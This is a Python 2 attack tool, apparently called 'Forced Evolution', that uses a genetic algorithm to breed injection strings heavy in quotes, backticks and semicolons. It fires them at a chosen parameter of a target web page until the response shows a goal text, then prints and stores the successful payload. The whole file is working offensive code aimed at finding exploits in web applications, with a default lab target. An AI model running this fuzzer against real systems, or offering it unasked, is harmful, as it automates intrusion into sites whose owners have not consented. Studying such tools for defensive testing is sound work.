#!/usr/bin/env python
import requests
import time
from sys import argv
from random import *
from socket import *
from Queue import PriorityQueue

print """
__                   __                        
|_  _  __ _  _  _|   |_     _  |    _|_ o  _ __ 
|  (_) | (_ (/_(_|   |__\_/(_) | |_| |_ | (_)| |

by soen
"""

def usage():
  print 'Usage:'
  print '  python fe.py <options>'
  print '  Options:'
  print '    TARGET=<target IP / hostname>'
  print '    ADDR=<directory>'
  print '    VULN_VAR=<vulnerable variable>'
  print '    METHOD=<post/get>'
  print '    OTHER_VARIABLES=[other variables for post/get request]'
  print '      VAR1=DATA1&VAR2=DATA2'
  print '    GOAL_TEXT=<server response indicating successful exploitation>'
  print
  print ' TARGET,ADDR,VULN_VAR,METHOD,GOAL_TEXT are required'
  exit(0)



start_time = time.time()
OTHER_VARIABLES = {}
GOAL_TEXT = 'KEY_DATA'
tools = """~!@#$%^&*()_+{}|:"<>?,./;'[]\=-0987654321`qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM"""
tools+= """$%*";'`""" * 3 # use this to influence creature evolution
TARGET = '192.168.1.11'
ADDR = 'vuln2/index.php'
#VULN_VAR = 'input'
VULN_VAR = 'password'
CREATURE_COUNT = 333 # this number will become multiplied by 3 due to the breeding with the database that will take place
GENOME_LENGTH = 32
CULL_RATE = 0.67
MUTATION_RATE = .80
TIMEOUT = .01
OTHER_VARIABLES[VULN_VAR] = 'AAAA'
GENE_POOL_INFLUENCE = 15 # pool will increase to (pool_original + loaded_genomes * GENE_POOL_INFLUENCE)
MAX_MUTATIONS = 1



if ((len(argv) != 6) and (len(argv) != 7)):
  usage()
try:
  TARGET = argv[1].split('=')[1]
  print '[+]\tTarget %s acquired!' % TARGET
  ADDR = argv[2].split('=')[1]
  if ADDR[0] == '/':
    ADDR = ADDR[1:]
  print '[+]\tPath %s acquired!' % ADDR
  VULN_VAR = argv[3].split('=')[1]
  print '[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR
  METHOD =(((argv[4].split('=')[1] == 'post') and 1) or 0)
  print '[+]\tUsing method [%s] for GREAT success' % ((METHOD and 'post') or 'get')
  OTHER_VARIABLES = {}
  if (len(argv) == 7):
    ov = argv[5][len('OTHER_VARIABLES='):]
    ov.replace('\"', '')
    ov = ov.split('&')
    #print ov
    for i in ov:
      (tmp_a, tmp_b) = i.split('=')
      #print 'setting %s to %s' % (tmp_a, tmp_b)
      OTHER_VARIABLES[tmp_a]=tmp_b
    #ov = ov.split('&')
    #ov = ov[1:]
    #OTHER_VARIABLES = {}
    #for i in range(0, len(ov) /2):
    #  OTHER_VARIABLES[ov[i * 2]] = ov[i * 2 + 1]
    #print OTHER_VARIABLES
    GOAL_TEXT = argv[6].split('=')[1]
  else:
    GOAL_TEXT = argv[5].split('=')[1]
except:
  print 'commandline argument FAIL\n\n'
  usage()



BASE_RESPONSE = requests.get('http://%s/%s' % (TARGET, ADDR), params=OTHER_VARIABLES, timeout=3).text
if BASE_RESPONSE.lower().find('not found') != -1  or BASE_RESPONSE.lower().find('404') != -1 :
  print '404 or \'not found\' discovered on page....are you sure this is OK?'
  print '\npage text:\n\n'
  print BASE_RESPONSE
  print
  if not raw_input('y/n').lower().find('y'):
    exit(0)
exploit_found = 0
REQ_TOTAL = 0




class Creature:
  genome = ''
  is_alive = False
  score = 100
  m_text = {}
  def __init__(self, args, tools):
    genome = ''
    self.modified = 1
    self.is_alive = True
    if args == 0:
      self.genome = tools
    else:
      tmp = args
      #print 'creating genome with '+ str(tmp) + 'chars'
      for i in range(randint(tmp / 2,tmp)):
        self.genome += tools[randrange(0,len(tools))]
    return None
  def run_simulation(self): #use ip addresses so dns resolution is not needed
    global TARGET, ADDR, VULN_VAR, TIMEOUT, REQ_TOTAL, METHOD, OTHER_VARIABLES
    tmp = OTHER_VARIABLES
    tmp[VULN_VAR] = self.genome
    try:
      #r = requests.get('http://%s/%s' % (TARGET, ADDR), params={VULN_VAR:self.genome}, timeout=TIMEOUT)
      if METHOD == 0:
        r = requests.get('http://%s/%s' % (TARGET, ADDR), params=tmp, timeout=TIMEOUT) #'username':'admin'
      else:
        r = requests.post('http://%s/%s' % (TARGET, ADDR), data=tmp, timeout=TIMEOUT)
      REQ_TOTAL+=1
      self.m_text['text'] = r.text
      self.m_text['status_code'] = r.status_code
    except:
      pass
    return self.m_text

#[X]  create the creatures
#[X]  initialize them
#[X]  while 1:
#[X]    run them (score them)
#[X]    sort
#[X]    cull lower 66%
#[X]    breed top 33% and leave parents (99%)

def create_creatures(num, genome_length, tools):
    c = []
    for i in range(0,num):
        c.append(Creature(genome_length, tools))
    return c

#  breed { A1A2 & B1B2
# A1B2
# B1A2
# a
# b }

def cull_it(c):
  global CULL_RATE
  c_temp = PriorityQueue()
  qsize = c.qsize()
  l = int(qsize - qsize * CULL_RATE)
  #print '[i]\tPopulation size %d, cull rate %s, living specimens: %d' % (c.qsize(), str(CULL_RATE), l)
  #print '[.]\tBeginning the cull of underperforming creatures...'
  for i in range(l):
    flag = 0
    while flag == 0:
      tmp = c.get()
      if tmp[1].genome != '':
        c_temp.put(tmp)
        flag = 1
  #print '[+]\tCull done!'
  return c_temp

def mutate(s):
  orig = s
  global tools, MUTATION_RATE
  num_mutations = 0
  for i in range(0, MAX_MUTATIONS):
    if random() < MUTATION_RATE:
      num_mutations += 1
  M_CHAR = 0.80
  A_CHAR = 0.60
  R_CHAR = 0.05
  for i in range(0, num_mutations):
    decision = random()
    m = tools[randint(0, len(tools)-1)]
    if decision > M_CHAR: # modify a character inline (20%)
      si = randint(0, len(s))
      s = s[0:si] + m + s[si+1:]
    elif decision < M_CHAR and decision > A_CHAR: # append a character (20%)
      s += m
    elif decision < M_CHAR and decision < A_CHAR and decision > R_CHAR: # prepend a character (50%)
      s = m + s
    elif decision < R_CHAR: # delete a character (10%)
      si = randint(0, len(s))
      s = s[0:si] + s[si+1:]
  return s

def breed_it(ca):
  c_temp = PriorityQueue()
  #print '[.]\tBreeding Next Generation...'
  while len(ca) > 0:
    if len(ca)==1:
      cq = ca.pop(0)
      c_temp.put((cq.score,cq))
      return c_temp
    a = ca.pop(0)
    a1 = a.genome[0:len(a.genome)/2]
    a2 = a.genome[len(a.genome):]
    b = ca.pop(randint(0,len(ca)-1))
    b1 = b.genome[0:len(b.genome)]
    b2 = b.genome[len(b.genome):]
    c = Creature(0, a1+b2)
    d = Creature(0, b1+a2)
    e = Creature(0, mutate(a1+b2))
    f = Creature(0, mutate(b1+a2))
    a.modified = 0
    b.modified = 0
    c.modified = 1
    d.modified = 1
    e.modified = 1
    f.modified = 1
    c_temp.put((0,a))
    c_temp.put((0,b))
    c_temp.put((0,c))
    c_temp.put((0,d))
    c_temp.put((0,e))
    c_temp.put((0,f))
  #print '[.]\tSuccess'
  return c_temp


def fitnessfunction(creature_to_score):
  global GOAL_TEXT
  #if creature_to_score.modified == 0:
  #  return 0
  s = creature_to_score.run_simulation()
  creature_to_score.score = 100
  if s=={}:
    creature_to_score.score = 100
    return
  if (s['text'].find(GOAL_TEXT) != -1):
    creature_to_score.score-=100
    print '[+]\tExploit Found'
    print """
------------------------------------------
 __    _                  _             | 
|_    |_) |  _  o _|_   _|_ _    __  _| | 
|__>< |   | (_) |  |_    | (_)|_|| |(_| o 
                                          
------------------------------------------"""
    print creature_to_score.genome
    print '------------------------------------------'
    f = open('database','a')
    f.write(creature_to_score.genome+'\n')
    f.close()
    return 1
  elif (str(s['status_code']) == '500'):
    creature_to_score.score-= 20
  elif s['text'].find(creature_to_score.genome) != -1:
    creature_to_score.score-= 10
  else:
    creature_to_score.score = 100
  if creature_to_score.score == 9999999999999999999: #thisAlgorithmBecomingSkynetCost
    exit()
  return 0

# main
c0 = []
c1 = PriorityQueue()

print '[+]\tLoading DB...'
#load in creatures from DB
f = open('database','a')
f.close()
f = open('database')
lc = f.read()
f.close()
loaded_creatures = lc.split('\n')
#finish loading
print '[+]\tSuccess'

print '[+]\tCreating initial batch of creatures...'
cl = create_creatures(CREATURE_COUNT, GENOME_LENGTH, tools)
generation = 0
for i in loaded_creatures:
  c1.put((50,Creature(0, i)))
  for ii in range(0,GENE_POOL_INFLUENCE-1):
    c1.put((50,Creature(0, mutate(i))))
for i in cl:
  c1.put((100,i))
print '[+]\tSuccess'

print '[+]\tPre-breeeding in loaded creatures with the population for great success'
while not c1.empty():
  c = c1.get()[1]
  c0.append(c)
c1 = breed_it(c0)
print '[+]\tSuccess'

while exploit_found == 0:
  generation+=1
  CREATURE_COUNT = c1.qsize()
  print '[>]\tRunning with creature_count %d,\tgeneration %d' % (CREATURE_COUNT, generation)
  c2 = PriorityQueue(0)
  cached_c = 0
  total_c = 0
  while not c1.empty():
    c = c1.get()[1]
    total_c += 1
    if c.modified==0:
      cached_c += 1
    if fitnessfunction(c) == 1:
      exploit_found = 1
      break
    c2.put((c.score, c))
  #print '[i]\tEfficiency %s, cached[%d], total[%d]' % (str((total_c-cached_c) * 1.0 / total_c),cached_c,total_c)
  c3 = cull_it(c2)
  c4 = []
  while not c3.empty():
    c = c3.get()[1]
    c4.append(c)
  c1 = breed_it(c4)
print '[i]\tExploit found in %d seconds with %d requests' % (abs(int(start_time - time.time())), REQ_TOTAL)
